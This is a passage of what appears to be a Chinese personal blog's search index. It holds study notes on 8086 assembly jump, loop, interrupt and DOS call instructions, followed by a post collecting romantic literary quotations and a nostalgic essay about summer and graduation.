title="JMP"></a>JMP</h4><ul><li>格式：<code>JMP dst</code></li><li>功能：无条件跳转到目的地址。</li></ul><p>跳转分为两种，一种是段内转移或近（NEAR）转移，跳转时仅改变 IP 的值，另一种是段间转移或远（FAR）转移，此时跳转长度超过 IP 最大值，CS 和 IP 都要改变。这两种情况都提供直接转移和间接转移两种方法，前者直接给出目的地址，后者将目的地址放在寄存器或者存储单元中。</p><table><thead><tr><th align="center">类型</th><th align="center">方式</th><th align="center">寻址目标</th><th align="center">举例</th></tr></thead><tbody><tr><td align="center">段内</td><td align="center">直接</td><td align="center">立即短转移（8位）</td><td align="center"><code>JMP SHORT 标号</code></td></tr><tr><td align="center">段内</td><td align="center">直接</td><td align="center">立即近转移（16位）</td><td align="center"><code>JMP NEAR PTR 标号</code>或<code>JMP 标号</code></td></tr><tr><td align="center">段内</td><td align="center">间接</td><td align="center">寄存器（16位）</td><td align="center"><code>JMP BX</code></td></tr><tr><td align="center">段内</td><td align="center">间接</td><td align="center">存储器（16位）</td><td align="center"><code>JMP WORD PTR 5[BX]</code></td></tr><tr><td align="center">段间</td><td align="center">直接</td><td align="center">立即转移（32位）</td><td align="center"><code>JMP FAR PTR 标号</code></td></tr><tr><td align="center">段间</td><td align="center">间接</td><td align="center">存储器（32位）</td><td align="center"><code>JMP DWORD PTR[REG]</code></td></tr></tbody></table><h4 id="CALL"><a href="#CALL" class="headerlink" title="CALL"></a>CALL</h4><ul><li>格式：<code>CALL 过程名</code></li><li>功能：调用过程。</li></ul><p>同样有段内与段间，直接与间接的区分，指令格式与 JMP 类似。</p><table><thead><tr><th align="center">类型</th><th align="center">方式</th><th align="center">寻址目标</th><th align="center">举例</th></tr></thead><tbody><tr><td align="center">段内</td><td align="center">直接</td><td align="center">立即调用</td><td align="center"><code>CALL 标号</code></td></tr><tr><td align="center">段内</td><td align="center">间接</td><td align="center">寄存器（16位）</td><td align="center"><code>CALL BX</code></td></tr><tr><td align="center">段内</td><td align="center">间接</td><td align="center">存储器（16位）</td><td align="center"><code>CALL WORD PTR 5[BX]</code></td></tr><tr><td align="center">段间</td><td align="center">直接</td><td align="center">立即调用（32位）</td><td align="center"><code>CALL FAR PTR 标号</code></td></tr><tr><td align="center">段间</td><td align="center">间接</td><td align="center">存储器（32位）</td><td align="center"><code>CALL DWORD PTR[REG]</code></td></tr></tbody></table><h4 id="RET"><a href="#RET" class="headerlink" title="RET"></a>RET</h4><ul><li>格式：<code>RET (n)</code></li><li>功能：过程返回。如果有 n 则在弹出返回地址后再弹出 n 个字节，这一目的是让调用过程可以传递参数。</li></ul><hr><h3 id="条件转移"><a href="#条件转移" class="headerlink" title="条件转移"></a>条件转移</h3><ul><li>格式：<code>操作符 标号</code></li><li>功能：根据操作符，满足即跳转到标号。</li></ul><h4 id="直接标志转移"><a href="#直接标志转移" class="headerlink" title="直接标志转移"></a>直接标志转移</h4><table><thead><tr><th align="center">指令</th><th align="center">测试条件</th><th align="center">判断条件</th></tr></thead><tbody><tr><td align="center"><code>JC</code>/<code>JNC</code></td><td align="center">CF = 1 / 0</td><td align="center">有 / 无进位</td></tr><tr><td align="center"><code>JZ</code>/<code>JNZ</code></td><td align="center">ZF = 1 / 0</td><td align="center">相等 / 不相等</td></tr><tr><td align="center"><code>JE</code>/<code>JNE</code></td><td align="center">ZF = 1 / 0</td><td align="center">相等 / 不相等</td></tr><tr><td align="center"><code>JS</code>/<code>JNS</code></td><td align="center">SF = 1 / 0</td><td align="center">符号为负 / 正</td></tr><tr><td align="center"><code>JO</code>/<code>JNO</code></td><td align="center">OF = 1 / 0</td><td align="center">溢出 / 无溢出</td></tr><tr><td align="center"><code>JP</code>/<code>JNP</code></td><td align="center">PF = 1 / 0</td><td align="center">为偶数 / 奇数</td></tr><tr><td align="center"><code>JPE</code>/<code>JPO</code></td><td align="center">PF = 1 / 0</td><td align="center">为偶数 / 奇数</td></tr></tbody></table><h4 id="无符号数比较测试"><a href="#无符号数比较测试" class="headerlink" title="无符号数比较测试"></a>无符号数比较测试</h4><table><thead><tr><th align="center">指令</th><th align="center">测试条件</th><th align="center">判断条件</th></tr></thead><tbody><tr><td align="center"><code>JA</code>/<code>JNBE</code></td><td align="center">CF ∨∨ ZF = 0</td><td align="center">高于 / 不低于等于</td></tr><tr><td align="center"><code>JAE</code>/<code>JNB</code></td><td align="center">CF = 0</td><td align="center">高于等于 / 不低于</td></tr><tr><td align="center"><code>JNAE</code>/<code>JB</code></td><td align="center">CF = 1</td><td align="center">不高于等于 / 低于</td></tr><tr><td align="center"><code>JNA</code>/<code>JBE</code></td><td align="center">CF ∨∨ ZF = 1</td><td align="center">不高于 / 低于等于</td></tr></tbody></table><h4 id="有符号数比较测试"><a href="#有符号数比较测试" class="headerlink" title="有符号数比较测试"></a>有符号数比较测试</h4><table><thead><tr><th align="center">指令</th><th align="center">测试条件</th><th align="center">判断条件</th></tr></thead><tbody><tr><td align="center"><code>JG</code>/<code>JNLE</code></td><td align="center">(SF XORXOR OF) ∨∨ ZF = 0</td><td align="center">大于 / 不小于等于</td></tr><tr><td align="center"><code>JGE</code>/<code>JNL</code></td><td align="center">SF XORXOR OF = 0</td><td align="center">大于等于 / 不小于</td></tr><tr><td align="center"><code>JNGE</code>/<code>JL</code></td><td align="center">SF XORXOR OF = 1</td><td align="center">不大于等于 / 小于</td></tr><tr><td align="center"><code>JNG</code>/<code>JLE</code></td><td align="center">(SF XORXOR OF) ∨∨ ZF = 1</td><td align="center">不大于 / 小于等于</td></tr></tbody></table><hr><h3 id="循环控制指令"><a href="#循环控制指令" class="headerlink" title="循环控制指令"></a>循环控制指令</h3><h4 id="LOOP"><a href="#LOOP" class="headerlink" title="LOOP"></a>LOOP</h4><ul><li>格式：<code>LOOP 标号</code></li><li>功能：跳至标号继续循环，每执行一次 CX 减一，若减一后为零则不跳转。</li></ul><h4 id="LOOPE-amp-LOOPNE"><a href="#LOOPE-amp-LOOPNE" class="headerlink" title="LOOPE &amp; LOOPNE"></a>LOOPE &amp; LOOPNE</h4><ul><li>格式：<code>LOOPE 标号</code> &amp; <code>LOOPNE 标号</code></li><li>功能：（不）相等时循环，其他与 LOOP 相同。</li></ul><h4 id="LOOPZ-amp-LOOPNZ"><a href="#LOOPZ-amp-LOOPNZ" class="headerlink" title="LOOPZ &amp; LOOPNZ"></a>LOOPZ &amp; LOOPNZ</h4><ul><li>格式：<code>LOOPZ 标号</code> &amp; <code>LOOPNZ 标号</code></li><li>功能：结果（不）为零时循环，其他与 LOOP 相同。</li></ul><h4 id="JCXZ"><a href="#JCXZ" class="headerlink" title="JCXZ"></a>JCXZ</h4><ul><li>格式：<code>JCXZ 标号</code></li><li>功能：CX 为零则跳转，否则就往下执行， CS 不会减一。</li></ul><hr><h3 id="中断指令"><a href="#中断指令" class="headerlink" title="中断指令"></a>中断指令</h3><h4 id="INT"><a href="#INT" class="headerlink" title="INT"></a>INT</h4><ul><li>格式：<code>INT n</code></li><li>功能：调用 n 对应的功能。</li></ul><h4 id="INTO"><a href="#INTO" class="headerlink" title="INTO"></a>INTO</h4><ul><li>格式：<code>INTO</code></li><li>功能：如果溢出标识 OF 为 1 则产生类型为 4 的中断，否则就继续向下执行。</li></ul><h4 id="IRET"><a href="#IRET" class="headerlink" title="IRET"></a>IRET</h4><ul><li>格式：<code>IRET</code></li><li>功能：中断返回。</li></ul><hr><h2 id="BIOS-amp-DOS-调用"><a href="#BIOS-amp-DOS-调用" class="headerlink" title="BIOS &amp; DOS 调用"></a>BIOS &amp; DOS 调用</h2><p>调用这两者用的是 INT 中断指令。</p><ul><li>格式：<code>INT n</code></li><li>功能：调用 n 对应的功能。</li></ul><p>其中 n = 21H 是最为强大的 DOS 中断。一般调用中断须先将参数放入指定寄存器，功能号放入 AH，子功能号放入 AL，例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV AX,4C00H </span><br><span class="line">INT 21H</span><br></pre></td></tr></table></figure><p>常用的功能号有</p><table><thead><tr><th align="center">功能号</th><th align="center">功能</th><th align="center">参数</th></tr></thead><tbody><tr><td align="center">01H</td><td align="center">输入一个字符</td><td align="center">AL = 输入字符</td></tr><tr><td align="center">0AH</td><td align="center">输入字符串</td><td align="center">DX:DX = 缓冲区首地址</td></tr><tr><td align="center">02H</td><td align="center">显示一个字符</td><td align="center">DL = 显示字符</td></tr><tr><td align="center">09H</td><td align="center">显示 $ 结尾的字符串</td><td align="center">DX:DX = 字符串首地址</td></tr></tbody></table><hr><h2 id="常用伪指令"><a href="#常用伪指令" class="headerlink" title="常用伪指令"></a>常用伪指令</h2><h3 id="数值回送操作符"><a href="#数值回送操作符" class="headerlink" title="数值回送操作符"></a>数值回送操作符</h3><h4 id="TYPE"><a href="#TYPE" class="headerlink" title="TYPE"></a>TYPE</h4><ul><li>格式：<code>TYPE expression_r(or label)</code></li><li>功能：返回变量以字节数表示的类型 &amp; 返回标号类型的数值</li></ul><h4 id="LENGTH"><a href="#LENGTH" class="headerlink" title="LENGTH"></a>LENGTH</h4><ul><li>格式：<code>TYPE variable</code></li><li>功能：对于变量使用DUP的情况,将回送分配给该变量的单元数; 对其它情况则回送1</li></ul><h4 id="SIZE"><a href="#SIZE" class="headerlink" title="SIZE"></a>SIZE</h4><ul><li>格式：<code>TYPE variable</code></li><li>功能：回送分配给该变量的字节数 = TYPE * LENGTH</li></ul><h4 id="OFFSET"><a href="#OFFSET" class="headerlink" title="OFFSET"></a>OFFSET</h4><ul><li>格式：<code>TYPE variable (or lable)</code></li><li>功能：回送变量或标号的偏移地址</li></ul><h4 id="SEG"><a href="#SEG" class="headerlink" title="SEG"></a>SEG</h4><ul><li>格式：<code>TYPE variable (or lable)</code></li><li>功能：回送变量或标号的段地址</li></ul><h3 id="数据定义语句"><a href="#数据定义语句" class="headerlink" title="数据定义语句"></a>数据定义语句</h3><ul><li>DB 定义字节,表示其后每个操作数占有一个字节(1Byte)单元</li><li>DW 定义字,表示表示其后每个操作数占有一个字(2Byte)单元</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data_byte     DB      10 , 4 , 10H , ?        ;共定义了4个字节,其中 &#39;?&#39; 是保留单元</span><br><span class="line"></span><br><span class="line">data_word    DW    100 DUP(?)            ;定义100个字的存储空间</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 汇编 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>短句分享</title>
      <link href="/2020/06/23/duanju1/"/>
      <url>/2020/06/23/duanju1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>摘抄了一些很美的短句</p></blockquote><a id="more"></a><p>1/</p><p>四月，应该坦坦荡荡，鸽子从屋檐拥向晴空，青藤从粉墙探向枝头，新茶从瓷碗吻向老桌，传说从故纸堆里挣脱，<strong>你带着苍绿的情书，生锈的戒指，以及喑哑的晚钟，风尘仆仆 ，从远方，奔向我 ，趁风月无边，浮了这盅千里烟波，从此隐入山中，陪你赏朝昏夕落。</strong></p><p>2/</p><p>你是一台磨人的机器 盛产爱和诗意</p><p>3/</p><p>我喜欢的少年打天上来</p><p>他无意掀翻烛火</p><p>点燃我双眸盛满的暮色</p><p> 4/</p><p>ᴹᵉᵉᵗ ʸᵒᵘ ᶠᵘˡˡ ᵒᶠ ˡᵒᵛᵉ / ˢᵉᵉ ᵉᵛᵉʳʸᵗʰⁱⁿᵍ ⁱⁿ ᵗʰᵉ ʷᵒʳˡᵈ / ᶠᵃˡˡ ⁱⁿ ˡᵒᵛᵉ ʷⁱᵗʰ ʸᵒᵘ.</p><p>遇见你爱意汹涌，看世间万物，都浪漫心动。  </p><p> 5/</p><p>山野千里，你是我藏在星星里的浪漫，无尽的温柔与风情都隐匿在皎月清辉中，今晚月色极美，我双手为你奉上</p><p>6/</p><p> 纯洁无暇的善良不够善良。</p><p>遭遇过一切挫折与人性考验后的善良温柔有力量。</p><p>7/</p><p> 很喜欢「日暮里」和「次日清晨」这两个词。<strong>一天的喜怒哀乐都溜进日暮里，在次日清晨给人以重新开始的无限可能。</strong> 疲倦落入温柔暮色里，我会在次日清晨醒着眼睛。</p><p>8/</p><p>あなたの优しさに私は心を引かれた</p><p>你的温柔打动了我的心</p><p>9/</p><p>我是如此单独而完整</p><p>在无数个夜晚我独自顶着冷风</p><p>伫立在老橘树下的桥头</p><p>只为听一曲夜莺的哀歌</p><p>我倚暖了石栏上的青苔</p><p>青苔凉透了我的心坎</p><p>但夜莺不来夜莺不来</p><p>——徐志摩 《我是如此单独而完整》</p><p>10/</p><p>千般荒凉，以此为梦。万里蹀躞，以此为归。</p><p>——余秋雨</p><img src='1.jpg' alt='落日熔金，暮云合璧'><p>11/</p><p> 太阳未出时，全世界都做一个梦，唯有月亮是真实的；</p><p>太阳出来后，全世界都真实了，唯有月亮像一个梦。</p><p>——《冬牧场》</p><p>12/</p><p>ᵂᵃⁿᵗ ᵗᵒ ᵇᵉ ʸᵒᵘʳ / ᵖⁱˡˡᵒʷ ᵇᵒᵒᵏ / ᶜᵃᵗ ⁱⁿ ʸᵒᵘʳ ᵃʳᵐˢ / ˡᵒᵛᵉᵈ ᵒⁿᵉ.</p><p>想做你的枕边书，怀中猫，意中人。 </p><p>13/</p><p>你踩着漫长星辰的光而来，而我在你到来的刹那便失了心智，从此山河过往，凛冬天明，你都有我。</p><p>14/</p><p>树在  山在  大地在</p><p>岁月在</p><p><strong>我在</strong></p><p><strong>你还要怎样更好的世界?</strong></p><p>——张晓风《我在》</p><p>15/</p><p>ᴱˣᵖᵉʳⁱᵉⁿᶜⁱⁿᵍ ᵃ ᵖᵉʳˢᵒⁿ’ˢ ˡᵒⁿᵉˡⁱⁿᵉˢˢ, ᵇᵘᵗ ᵃˡˢᵒ ᵉˣᵖᵉʳⁱᵉⁿᶜⁱⁿᵍ ᵗʰᵉ ᵍⁱᶠᵗ ᵒᶠ ˡᵒⁿᵉˡⁱⁿᵉˢˢ.</p><p>经历着一个人的孤独，也经历着孤独的馈赠。</p><p>16/</p><p>我是个俗气至顶的人，</p><p>见山是山，见海是海，见花便是花。</p><p>唯独见了你，</p><p>云海开始翻涌，江潮开始澎湃，</p><p>昆虫的小触须挠着全世界的痒。</p><p>你无需开口，我和天地万物便通通奔向你。</p><p>17/</p><p>余光中先生说，月色与雪色之间，你是第三种绝色，于我而言,日月星辉之中,你是第四种难得。</p><p>18/</p><p>昼も夜も春も渡らず，夜も眠れない星</p><p>白日春不渡，黑夜万梦星。</p><p>19/</p><p>我是半坏街灯 是将冷煤炭 闪闪烁烁 明明暗暗 只想把有限的光和热 全都给你。</p><p> 20/</p><p>我怀念那个秋天，但我不会因此止步不前我会把有关你的记忆隐于心弦，当然不包括那偶尔泄出的一些思念。</p><img src='2.jpg' alt='风月天边有'><p>21/</p><p>ᵀʰᵉ ᵍʳᵉᵃᵗᵉˢᵗ ʳᵒᵐᵃⁿᶜᵉ ⁱˢ ᵗʰᵉ ᶠᵒᶜᵘˢ ᵒᶠ ᵒⁿᵉ’ˢ ˡⁱᶠᵉ.</p><p>最盛大的浪漫是终其一生的专注。</p><p> 22/</p><p>我希望有个如你一般的人 如山间清爽的风如古城温暖的光，从清晨到夜晚，由山野到书房，不怕路途遥远，只要最后是你就好。</p><p>23/</p><p>我想和你一起生活</p><p>在某个小镇</p><p>共享无尽的黄昏</p><p>和绵绵不绝的钟声</p><p>——茨 维塔耶娃</p><p>24/</p><p>ᴵ ʰᵃᵛᵉ ˢᵃᵛᵉᵈ ᵗᵉⁿᵈᵉʳⁿᵉˢˢ ᵃⁿᵈ ʳᵒᵐᵃⁿᶜᵉ ᶠᵒʳ ᵃ ˡᵒⁿᵍ ᵗⁱᵐᵉ. ᴵ ʷᵃⁿᵗ ᵗᵒ ᵍⁱᵛᵉ ⁱᵗ ᵗᵒ ʸᵒᵘ ᵃˡˡ ᵃᵗ ᵒⁿᶜᵉ.</p><p>攒了好久的温柔与浪漫，想要一次性都给你。 </p><p>25/ </p><p>岁月极美，在于它必然的流逝。 </p><p>春花、秋月、夏日、冬雪。</p><p> 26/</p><p>今夜（こんや）は月（つき）が綺麗（きれい）ですね。</p><p>今晚月色真美。</p><p>27/</p><p><strong>世人慌慌张张，不过是图碎银几两。偏偏这碎银几两，能解世间惆怅，可让父母安康，可护幼子成长，但这碎银几两，也断了儿时的念想，让少年染上沧桑，压弯了脊梁。</strong></p><p>28/</p><p>我是春天里出生的绿皮野兽</p><p>在秋夜里吞下十瓣月亮</p><p>——《桔子》高鹤鸣</p><p>29/</p><p>夏天属于散文和柠檬，属于裸露和慵懒，属于关于回归的想像的永恒闲置，属于稀见的长笛和赤裸的双足，还有八月的卧室卧室中绞结的床单和周日的盐</p><p>——德里克·沃尔科特《夏天的布里克街》</p><p>30/</p><p>读书到某个相似段落的恍神，在外喝冷饮唤起味觉的苏醒，抑或是整理旧衣物时不落痕迹的叹息。这些由你衍生出来的琐碎，在数年如一日的白夜里，融汇成轻柔而遥远的光河。不再触及我。却依然照耀我。</p><img src='3.jpg' alt='凉风有信，风月无边'><p>31/</p><p>最短暂的幸福感和最漫长的余韵，在到达最顶峰的时候迫近死亡，每个人的生命中都有一段summer time。</p><p>32/</p><p>你已穿上书页般的衣冠</p><p>步行在恭敬的瓶形尸首间</p><p>——张枣《十月之水》</p><p>33/</p><p>谁端着夜的筛子<br>将一粒粒光豆豆<br>不停地筛了出来<br>——《星空》</p><p>34/</p><p>我是馊掉的柳丁汁和浓汤，我是爬满虫卵的玫瑰和百合，我是灯火流离的都市里明明存在却没人看得到也没人需要的北极星。</p><p>——林奕含《房思琪的初恋乐园》</p><p>35/</p><p><strong>夕阳染病<br>像潦倒的诗人<br>醉落西湖</strong><br>——《夕阳西下》周末有约</p><p>36/</p><p>阳光退出院子，退得那么慢，其间还有多次停顿，如同一种哽咽。</p><p>——余秀华《月光落在左手上》</p><p>37/</p><p>掉头一去是风吹黑发，回首再来已雪满白头。</p><p>下次你路过，人间已无我。</p><p>——余光中《欢呼哈雷》</p><p>38/</p><p>他来时风尘仆仆，停时依旧是光。</p><p>——高台树色《白日事故》</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>夏天的风</title>
      <link href="/2020/06/21/xiatiandefeng/"/>
      <url>/2020/06/21/xiatiandefeng/</url>
      
        <content type="html"><![CDATA[<blockquote><p>“在夏天，我们吃绿豆、桃、樱桃和甜瓜。在各种意义上都漫长且愉快，日子发出声响。”</p><p>​                                                                                                ——罗伯特·瓦尔泽《夏天》</p></blockquote><a id="more"></a><p>喜欢夏天，大概是因为夏日有一种特别的感觉吧。</p><p>夏天和雨天一样，有一种特别的韵味。夏天也很有故事感，记忆中好多事都是发生在夏天。夏天也有童年，青春的味道。</p><p>尤其是夏日的午后，蝉声鸣叫，很多人在午睡，全世界就好像安静了下来，只剩自然的声音。</p><p>时光流逝得很慢，蓝蓝的天空，强烈的阳光，喜欢的人。是我爱得无法自拔的夏日～</p><p>印象最深的仍然是那个起风了的夏天，当时的冰淇淋很冰也很甜。</p><p>暗晚风吹起你鬓间的发，抚平回忆留下的疤，你的眼中明交杂，一笑生花。当时是18年的夏天，也是高中毕业的那个夏天。有很复杂的感情，怀念那时的同学，怀念高三的教室，怀念当初那个懵懂无知的自己，怀念着我的青春。</p><p>我们回忆18年的夏天，不是回忆某一年的夏天，每个夏天都不一样，每个人青春的基调却是一样的，有着遗憾，仓促，惋惜</p><p>在这之中，我们变成为现在的自己</p><p>不一定说是我们一定变好了，只是，我们终究长大了</p><p>我们怀念的夏天，只属于我们这一代人</p><p>每一代人的青春都只属于自己</p><p>就像我曾经深爱的你</p><p>后悔吗？</p><p>不知道</p><p>太多太多理由让我喜欢这个季节了</p><p>湛蓝湛蓝的天空，饱满饱满的云朵，树林阴影里穿过凉风，白杨树浓密的叶子簌簌作响，一望无际的田野带着幽香，浓烈的太阳晒得人直发昏，汽车飞驰而过会卷起街道上的尘土，深井里有清冽的凉水，地窖里有甘甜的西瓜，阴凉土房里有的舒服过堂风，漫长的午觉伴着声嘶力竭的蝉鸣。</p><p>学校里还有开了的合欢树，有月季花田，有玉簪，有大湖，外面的小南门里有炸鸡，有热干面，有寿司，有炸串，有麻辣烫，有西瓜。</p><p>在学校，每次下晚课回去的路上很热闹，有情侣争吵，也有热情调笑，他们走在一起，就像青春飘荡在夏风中</p><p>去年夏天我一个人走了很多没走过的路，也遇见和失去了喜欢的人</p><p>我看见了烟波画船，云霞翠轩<br>感受到了朝飞暮卷，雨丝风片</p><p>晚上有时会在小区里溜达，好天气的夜空中能看见浓烈的流云，云片被夜风吹的翻飞。有时也能看见星星。有时也经常和朋友一起去烧烤，坐在露天烧烤摊，吃很多牛板筋，烤土豆，豆角，金针菇，喝下大杯的啤酒，满桌子的小龙虾残骸还有蛤蜊壳。</p><p>夕阳在楼区间若隐若现，晚霞也都被分割成一条一条。</p><blockquote><p>绿槐高柳咽新蝉，薰风初入弦。碧纱窗下水沉烟，棋声惊昼眠。微雨过，小荷翻，榴花开欲然。玉盆纤手弄清泉，琼珠碎却圆。·我喜欢夏日的永昼，我喜欢在多风的黄昏独坐在傍山的阳台上。小山谷里稻浪推涌，美好的稻香翻腾着。慢慢地，绚丽的云霞被浣净了，柔和的晚星一一就位。——张晓风《我喜欢》</p></blockquote><blockquote><p>微风拂过海面，蝉鸣漾入云间。叽叽喳喳的笑声在沙滩上留下深浅不一的足迹，盛暑阳光夺神炫目，模糊了远近的归船。</p></blockquote><p>我希望今年的夏天还能走很多很多的路，吃很多烧烤，西瓜和冰棍。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
